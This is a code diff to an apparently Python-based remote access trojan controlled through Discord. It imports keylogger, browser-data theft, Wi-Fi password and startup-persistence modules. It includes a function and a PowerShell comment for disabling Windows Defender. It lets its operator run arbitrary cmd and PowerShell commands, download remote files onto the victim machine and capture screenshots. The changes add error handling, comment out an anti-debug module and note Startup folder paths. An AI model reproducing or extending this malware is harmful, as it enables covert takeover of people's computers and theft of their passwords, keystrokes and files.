@@ -2,14 +2,19 @@ import os, discord, subprocess, requests, ctypes, zipfile
 from PIL import ImageGrab, Image
 import cv2
 from tkinter import messagebox
-from config import TOKEN, GUILD_ID, DEFENDER, ERROR
+from config import TOKEN, GUILD_ID, DEFENDER, ERROR#, ANTIDEBUG
 from modules.browser import run, delete_files
 from modules.keylogger import Keylogger
+#from modules.antidebug import Antidebug
 from modules.info import start
 from modules.wifi import WifiPasswords
 from pyperclip import paste
 from modules.startup import Startup
 
+
+
+#if ANTIDEBUG:
+#    Antidebug()
 
 def disable_defender():
     #C:\> Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend && Set-MpPreference -SubmitSamplesConsent 2
@@ -254,17 +259,25 @@ async def on_message(message):
 
     elif message.content.startswith("upload"):
         link = message.content[7:] #.split(" ")[1]
-        file = requests.get(link).content
-        with open(os.path.basename(link), "wb") as f:
-            f.write(file)
+        try:
+            file = requests.get(link).content
+            with open(os.path.basename(link), "wb") as f:
+                f.write(file)
+        except:
+            await message.reply("Failed to upload the file!")
+            return
         embed = discord.Embed(title="Upload", description=f"```{os.getcwd()}{os.path.basename(link)}```", color=0xfafafa)
         await message.reply(embed=embed)
 
     elif message.content.startswith("cmd"):
         command = message.content[4:]
-        output = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True).communicate()#[0].decode("utf-8")
-        error_output = output[1].decode("utf-8")
-        normal_output = output[0].decode("utf-8")
+        try:
+            output = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True).communicate()#[0].decode("utf-8")
+            error_output = output[1].decode("utf-8")
+            normal_output = output[0].decode("utf-8")
+        except:
+            await message.reply("Failed to execute pw command!")
+            return
         
         embed = discord.Embed(title=f"{os.getcwd()}", description="", color=0xfafafa)
         
@@ -300,9 +313,13 @@ async def on_message(message):
         
     elif message.content.startswith("pw"):
         command = message.content[3:]
-        output = subprocess.Popen(["powershell", command], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True).communicate()#[0].decode("utf-8")
-        error_output = output[1].decode("utf-8")
-        normal_output = output[0].decode("utf-8")
+        try:
+            output = subprocess.Popen(["powershell", command], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True).communicate()#[0].decode("utf-8")
+            error_output = output[1].decode("utf-8")
+            normal_output = output[0].decode("utf-8")
+        except:
+            await message.reply("Failed to execute pw command!")
+            return
         
         embed = discord.Embed(title=f"{os.getcwd()}", description="", color=0xfafafa) # description=f"```{output}```",
         
@@ -390,11 +407,11 @@ async def on_message(message):
     elif message.content == "screenshot":
         try:
             screenshot = ImageGrab.grab(all_screens=True)
+            path = os.path.join(os.getenv("TEMP"), "screenshot.png")
+            screenshot.save(path)
         except:
             await message.reply("Failed to take screenshot!")
             return
-        path = os.path.join(os.getenv("TEMP"), "screenshot.png")
-        screenshot.save(path)
         file = discord.File(path)
         embed = discord.Embed(title="Screenshot", color=0xfafafa)
         embed.set_image(url="attachment://screenshot.png")
@@ -453,3 +470,11 @@ try:
     client.run(TOKEN)
 except:
     pass
+
+
+#C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
+#C:\Users\Korisnik\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+
+
+
+#C:\Users\Korisnik\AppData\Roaming\MicrosoftWindows\System
